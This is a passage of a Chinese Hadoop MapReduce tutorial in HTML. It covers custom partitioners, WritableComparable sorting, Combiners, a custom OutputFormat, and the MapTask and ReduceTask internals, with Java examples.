class="comment">//这是默认分区return (key.hashCode()&amp;Integer.MAX_VALUE)% numReduceTasks;</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProvincePartitioner</span> <span class="keyword">extends</span> <span class="title">Partitioner</span>&lt;<span class="title">Text</span>, <span class="title">FlowBean</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getPartition</span><span class="params">(Text text, FlowBean flowBean, <span class="keyword">int</span> numPartitions)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//获取手机号前三位prePhone</span></span><br><span class="line">        String phone = text.toString();</span><br><span class="line">        String prePhone = phone.substring(<span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//定义一个分区号变量partition,根据prePhone设置分区号</span></span><br><span class="line">        <span class="keyword">int</span> partition;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="string">"136"</span>.equals(prePhone))&#123;</span><br><span class="line">            partition = <span class="number">0</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">"137"</span>.equals(prePhone))&#123;</span><br><span class="line">            partition = <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">"138"</span>.equals(prePhone))&#123;</span><br><span class="line">            partition = <span class="number">2</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">"139"</span>.equals(prePhone))&#123;</span><br><span class="line">            partition = <span class="number">3</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            partition = <span class="number">4</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//最后返回分区号partition</span></span><br><span class="line">        <span class="keyword">return</span> partition;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//最后在driver里修改代码</span></span><br><span class="line"><span class="comment">//8 指定自定义分区器</span></span><br><span class="line">job.setPartitionerClass(ProvincePartitioner<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"><span class="comment">//9 同时指定相应数量的ReduceTask</span></span><br><span class="line">job.setNumReduceTasks(<span class="number">5</span>);</span><br></pre></td></tr></table></figure><p><strong>WritableComparable排序</strong></p><p>MapTask和ReduceTask均会对数据按照key进行排序。该操作属于Hadoop的默认行为。任何应用程序中的数据均会被排序，而不管逻辑上是否需要。默认排序是按照字典顺序排序，且实现该排序的方法是快速排序。</p><ul><li>对于MapTask，它会将处理的结果暂时放到环形缓冲区中，当环形缓冲区使用率达到一定阈值后，再对缓冲区中的数据进行一次快速排序，并将这些有序数据溢写到磁盘上，而当数据处理完毕后，它会对磁盘上所有文件进行归并排序</li><li>对于ReduceTask，它从每个MapTask上远程拷贝相应的数据文件，如果文件大小超过一定阈值，则溢写磁盘上，否则存储在内存中。如果磁盘上文件数目达到一定阈值，则进行一次归并排序以生成一个更大文件;如果内存中文件大小或者数目超过一定阈值，则进行一次合并后将数据溢写到磁盘上。当所有数据拷贝完毕后，ReduceTask统一对内存和磁盘上的所有数据进行一次归并排序。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// WritableComparable排序案例实操（全排序）</span></span><br><span class="line"><span class="comment">// 对上面序列化案例的FlowBean重写其compare接口</span></span><br><span class="line"><span class="comment">// 目标根据总流量倒叙进行排序</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compareTo</span><span class="params">(FlowBean o)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//按照总流量比较,倒序排列</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">this</span>.sumFlow &gt; o.sumFlow)&#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>.sumFlow &lt; o.sumFlow)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//编写Mapper类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FlowMapper</span> <span class="keyword">extends</span> <span class="title">Mapper</span>&lt;<span class="title">LongWritable</span>, <span class="title">Text</span>, <span class="title">FlowBean</span>, <span class="title">Text</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> FlowBean outK = <span class="keyword">new</span> FlowBean();</span><br><span class="line">    <span class="keyword">private</span> Text outV = <span class="keyword">new</span> Text();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">map</span><span class="params">(LongWritable key, Text value, Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//1 获取一行数据</span></span><br><span class="line">        String line = value.toString();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2 按照"\t",切割数据</span></span><br><span class="line">        String[] split = line.split(<span class="string">"\t"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3 封装outK outV</span></span><br><span class="line">        outK.setUpFlow(Long.parseLong(split[<span class="number">1</span>]));</span><br><span class="line">        outK.setDownFlow(Long.parseLong(split[<span class="number">2</span>]));</span><br><span class="line">        outK.setSumFlow();</span><br><span class="line">        outV.set(split[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//4 写出outK outV</span></span><br><span class="line">        context.write(outK,outV);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//编写Reducer类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FlowReducer</span> <span class="keyword">extends</span> <span class="title">Reducer</span>&lt;<span class="title">FlowBean</span>, <span class="title">Text</span>, <span class="title">Text</span>, <span class="title">FlowBean</span>&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">reduce</span><span class="params">(FlowBean key, Iterable&lt;Text&gt; values, Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//遍历values集合,循环写出,避免总流量相同的情况</span></span><br><span class="line">        <span class="keyword">for</span> (Text value : values) &#123;</span><br><span class="line">            <span class="comment">//调换KV位置,反向写出</span></span><br><span class="line">            context.write(value,key);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//编写Driver类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FlowDriver</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException, InterruptedException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//1 获取job对象</span></span><br><span class="line">        Configuration conf = <span class="keyword">new</span> Configuration();</span><br><span class="line">        Job job = Job.getInstance(conf);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2 关联本Driver类</span></span><br><span class="line">        job.setJarByClass(FlowDriver<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3 关联Mapper和Reducer</span></span><br><span class="line">        job.setMapperClass(FlowMapper<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        job.setReducerClass(FlowReducer<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//4 设置Map端输出数据的KV类型</span></span><br><span class="line">        job.setMapOutputKeyClass(FlowBean<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        job.setMapOutputValueClass(Text<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//5 设置程序最终输出的KV类型</span></span><br><span class="line">        job.setOutputKeyClass(Text<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        job.setOutputValueClass(FlowBean<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//6 设置输入输出路径</span></span><br><span class="line">        FileInputFormat.setInputPaths(job, <span class="keyword">new</span> Path(<span class="string">"D:\\inputflow2"</span>));</span><br><span class="line">        FileOutputFormat.setOutputPath(job, <span class="keyword">new</span> Path(<span class="string">"D:\\comparout"</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//7 提交Job</span></span><br><span class="line">        <span class="keyword">boolean</span> b = job.waitForCompletion(<span class="keyword">true</span>);</span><br><span class="line">        System.exit(b ? <span class="number">0</span> : <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Combiner合并</strong></p><ul><li>Combiner是MR程序中Mapper和口Reducer之外的—种组件</li><li>Combiner组件的父类就是Reducer</li><li>Cobiner和口Reducer的区别在于运行的位置<ul><li>Combiner是在每一个MapTask所在的节点运行;</li><li>Reducer是接收全局所有Mapper的输出结果;</li></ul></li><li>Combiner的意义就是对每一个MapTask的输出进行局部汇总，以减小网络传输量</li><li>Combiner能够应用的前提是不能影响最终的业务逻辑，而且Combiner的输出kv应该跟Reducer的输入kv类型要对应起来</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Combiner合并案例实操</span></span><br><span class="line"><span class="comment">//认情况下，如果没有指定Combiner类，则不会执行Combiner操作</span></span><br><span class="line"><span class="comment">//增加一个WordCountCombiner类继承Reducer</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WordCountCombiner</span> <span class="keyword">extends</span> <span class="title">Reducer</span>&lt;<span class="title">Text</span>, <span class="title">IntWritable</span>, <span class="title">Text</span>, <span class="title">IntWritable</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> IntWritable outV = <span class="keyword">new</span> IntWritable();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">reduce</span><span class="params">(Text key, Iterable&lt;IntWritable&gt; values, Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (IntWritable value : values) &#123;</span><br><span class="line">            sum += value.get();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//封装outKV</span></span><br><span class="line">        outV.set(sum);</span><br><span class="line">        <span class="comment">//写出outKV</span></span><br><span class="line">        context.write(key,outV);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//在WordcountDriver驱动类中指定Combiner</span></span><br><span class="line"><span class="comment">// 指定需要使用combiner，以及用哪个类作为combiner的逻辑</span></span><br><span class="line"><span class="comment">// 不过一般直接用reduce的类即可</span></span><br><span class="line">job.setCombinerClass(WordCountCombiner<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果设置job.setNumReduceTasks(0);即没有reduce阶段，那么shuffle后面的都不会有</span></span><br></pre></td></tr></table></figure><h3 id="3-4-OutputFormat数据输出">3.4 OutputFormat数据输出</h3><p>OutputFomat是MapReduce输出的基类，所有实现MapReduce输出都实现了OutputFormat接口。默认是TextOutputFormat</p><p><img src="http://qnypic.shawncoding.top/blog/202401251330924.png" alt></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//自定义OutputFormat案例实操</span></span><br><span class="line"><span class="comment">// 编写 LogMapper 类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LogMapper</span> <span class="keyword">extends</span> <span class="title">Mapper</span>&lt;<span class="title">LongWritable</span>, <span class="title">Text</span>,<span class="title">Text</span>,</span></span><br><span class="line"><span class="class">        <span class="title">NullWritable</span>&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">map</span><span class="params">(LongWritable key, Text value, Context context)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> IOException, InterruptedException </span>&#123;</span><br><span class="line">        <span class="comment">//不做任何处理,直接写出一行 log 数据</span></span><br><span class="line">        context.write(value, NullWritable.get());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//编写 LogReducer 类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LogReducer</span> <span class="keyword">extends</span> <span class="title">Reducer</span>&lt;<span class="title">Text</span>, <span class="title">NullWritable</span>,<span class="title">Text</span>,</span></span><br><span class="line"><span class="class">        <span class="title">NullWritable</span>&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">reduce</span><span class="params">(Text key, Iterable&lt;NullWritable&gt; values, Context</span></span></span><br><span class="line"><span class="function"><span class="params">            context)</span> <span class="keyword">throws</span> IOException, InterruptedException </span>&#123;</span><br><span class="line">        <span class="comment">// 防止有相同的数据,迭代写出</span></span><br><span class="line">        <span class="keyword">for</span> (NullWritable value : values) &#123;</span><br><span class="line">            context.write(key, NullWritable.get());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//自定义一个 LogOutputFormat 类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LogOutputFormat</span> <span class="keyword">extends</span> <span class="title">FileOutputFormat</span>&lt;<span class="title">Text</span>, <span class="title">NullWritable</span>&gt;</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> RecordWriter&lt;Text, NullWritable&gt;</span><br><span class="line">    getRecordWriter(TaskAttemptContext job) <span class="keyword">throws</span> IOException,</span><br><span class="line">            InterruptedException &#123;</span><br><span class="line">        <span class="comment">//创建一个自定义的 RecordWriter 返回</span></span><br><span class="line">        LogRecordWriter logRecordWriter = <span class="keyword">new</span> LogRecordWriter(job);</span><br><span class="line">        <span class="keyword">return</span> logRecordWriter;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//编写 LogRecordWriter 类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LogRecordWriter</span> <span class="keyword">extends</span> <span class="title">RecordWriter</span>&lt;<span class="title">Text</span>, <span class="title">NullWritable</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> FSDataOutputStream atguiguOut;</span><br><span class="line">    <span class="keyword">private</span> FSDataOutputStream otherOut;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LogRecordWriter</span><span class="params">(TaskAttemptContext job)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//获取文件系统对象</span></span><br><span class="line">            FileSystem fs = FileSystem.get(job.getConfiguration());</span><br><span class="line">            <span class="comment">//用文件系统对象创建两个输出流对应不同的目录</span></span><br><span class="line">            atguiguOut = fs.create(<span class="keyword">new</span> Path(<span class="string">"d:/hadoop/atguigu.log"</span>));</span><br><span class="line">            otherOut = fs.create(<span class="keyword">new</span> Path(<span class="string">"d:/hadoop/other.log"</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">write</span><span class="params">(Text key, NullWritable value)</span> <span class="keyword">throws</span> IOException, InterruptedException </span>&#123;</span><br><span class="line">        String log = key.toString();</span><br><span class="line">        <span class="comment">//根据一行的log数据是否包含atguigu,判断两条输出流输出的内容</span></span><br><span class="line">        <span class="keyword">if</span> (log.contains(<span class="string">"atguigu"</span>)) &#123;</span><br><span class="line">            atguiguOut.writeBytes(log + <span class="string">"\n"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            otherOut.writeBytes(log + <span class="string">"\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">(TaskAttemptContext context)</span> <span class="keyword">throws</span> IOException, InterruptedException </span>&#123;</span><br><span class="line">        <span class="comment">//关流</span></span><br><span class="line">        IOUtils.closeStream(atguiguOut);</span><br><span class="line">        IOUtils.closeStream(otherOut);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//编写LogDriver类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LogDriver</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, InterruptedException </span>&#123;</span><br><span class="line"></span><br><span class="line">        Configuration conf = <span class="keyword">new</span> Configuration();</span><br><span class="line">        Job job = Job.getInstance(conf);</span><br><span class="line"></span><br><span class="line">        job.setJarByClass(LogDriver<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        job.setMapperClass(LogMapper<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        job.setReducerClass(LogReducer<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">        job.setMapOutputKeyClass(Text<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        job.setMapOutputValueClass(NullWritable<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">        job.setOutputKeyClass(Text<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        job.setOutputValueClass(NullWritable<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置自定义的outputformat</span></span><br><span class="line">        job.setOutputFormatClass(LogOutputFormat<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">        FileInputFormat.setInputPaths(job, <span class="keyword">new</span> Path(<span class="string">"D:\\input"</span>));</span><br><span class="line">        <span class="comment">//虽然我们自定义了outputformat，但是因为我们的outputformat继承自fileoutputformat</span></span><br><span class="line">        <span class="comment">//而fileoutputformat要输出一个_SUCCESS文件，所以在这还得指定一个输出目录</span></span><br><span class="line">        FileOutputFormat.setOutputPath(job, <span class="keyword">new</span> Path(<span class="string">"D:\\logoutput"</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">boolean</span> b = job.waitForCompletion(<span class="keyword">true</span>);</span><br><span class="line">        System.exit(b ? <span class="number">0</span> : <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-5-MapReduce内核源码解析">3.5 MapReduce内核源码解析</h3><p><strong>MapTask工作机制</strong></p><ul><li>Read阶段：MapTask通过InputFormat获得的RecordReader，从输入InputSplit中解析出一个个key/value</li><li>Map阶段：该节点主要是将解析出的key/value交给用户编写map()函数处理，并产生一系列新的key/value</li><li>Collect收集阶段：在用户编写map()函数中，当数据处理完成后，一般会调用OutputCollector.collect()输出结果。在该函数内部，它会将生成的key/value分区（调用Partitioner），并写入一个环形内存缓冲区中</li><li>Spill阶段：即&quot;溢写&quot;，当环形缓冲区满后，MapReduce会将数据写到本地磁盘上，生成一个临时文件。需要注意的是，将数据写入本地磁盘之前，先要对数据进行一次本地排序，并在必要时对数据进行合并、压缩等操作。溢写阶段详情：<ul><li>步骤1：利用快速排序算法对缓存区内的数据进行排序，排序方式是，先按照分区编号Partition进行排序，然后按照key进行排序。这样，经过排序后，数据以分区为单位聚集在一起，且同一分区内所有数据按照key有序。</li><li>步骤2：按照分区编号由小到大依次将每个分区中的数据写入任务工作目录下的临时文件output/spillN.out（N表示当前溢写次数）中。如果用户设置了Combiner，则写入文件之前，对每个分区中的数据进行一次聚集操作。</li><li>步骤3：将分区数据的元信息写到内存索引数据结构SpillRecord中，其中每个分区的元信息包括在临时文件中的偏移量、压缩前数据大小和压缩后数据大小。如果当前内存索引大小超过1MB，则将内存索引写到文件output/spillN.out.index中。</li></ul></li><li>Merge阶段：当所有数据处理完成后，MapTask对所有临时文件进行一次合并，以确保最终只会生成一个数据文件。当所有数据处理完后，MapTask会将所有临时文件合并成一个大文件，并保存到文件output/file.out中，同时生成相应的索引文件output/file.out.index。在进行文件合并过程中，MapTask以分区为单位进行合并。对于某个分区，它将采用多轮递归合并的方式。每轮合并mapreduce.task.io.sort.factor（默认10）个文件，并将产生的文件重新加入待合并列表中，对文件排序后，重复以上过程，直到最终得到一个大文件。让每个MapTask最终只生成一个数据文件，可避免同时打开大量文件和同时读取大量小文件产生的随机读取带来的开销</li></ul><p><img src="http://qnypic.shawncoding.top/blog/202401251330925.png" alt></p><p><strong>ReduceTask工作机制</strong></p><ul><li>Copy阶段：ReduceTask从各个MapTask上远程拷贝一片数据，并针对某一片数据，如果其大小超过一定阈值，则写到磁盘上，否则直接放到内存中</li><li>Sort阶段：在远程拷贝数据的同时，ReduceTask启动了两个后台线程对内存和磁盘上的文件进行合并，以防止内存使用过多或磁盘上文件过多。按照MapReduce语义，用户编写reduce()函数输入数据是按key进行聚集的一组数据。为了将key相同的数据聚在一起，Hadoop采用了基于排序的策略。由于各个MapTask已经实现对自己的处理结果进行了局部排序，因此，ReduceTask只需对所有数据进行一次归并排序即可</li><li>Reduce阶段：reduce()函数将计算结果写到HDFS上。</li></ul><p><img src="http://qnypic.shawncoding.top/blog/202401251330926.png" alt></p><p><strong>ReduceTask并行度决定机制</strong></p><p>MapTask并行度由切片个数决定，切片个数由输入文件和切片规则决定。reduceTask的并行度同样影响整个Job的执行并发度和执行效率，但与MapTask的并发数由切片数决定不同，ReduceTask数量的决定是可以直接手动设置</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 默认值是1，手动设置为4</span></span><br><span class="line">job.setNumReduceTasks(<span class="number">4</span>);</span><br><span class="line"><span class="comment">// ReduceTask=O，表示漫有Reduce阶段，输出文件个数数口Map个数一致。</span></span><br><span class="line"><span class="comment">// ReduceTask:默认值就是1，所以输出文件个数为一个。</span></span><br><span class="line"><span class="comment">// 如果数据分布不均匀，就有可能在Reduce阶段产生数居倾斜</span></span><br><span class="line"><span class="comment">// ReduceTask数量并不是任意设置，还要考虑业务逻辑需求，有些情况下，需要计算全局汇总结果，就只能有1个ReduceTask。</span></span><br><span class="line"><span class="comment">// 具体多少个ReduceTask，需要根据集群性能而定。一般等于cpu内核数最佳</span></span><br><span class="line"><span class="comment">// 如果分区数不是1，但是ReduceTask为1，是否执行分区过程。答案是:不执行分区过程。因为在M apTask的源码中，执行分区的前提是先判断ReduceNum个数是否大于1。不大于1肯定不执行。</span></span><br></pre></td></tr></table></figure><p><strong>MapTask &amp; ReduceTask源码解析</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 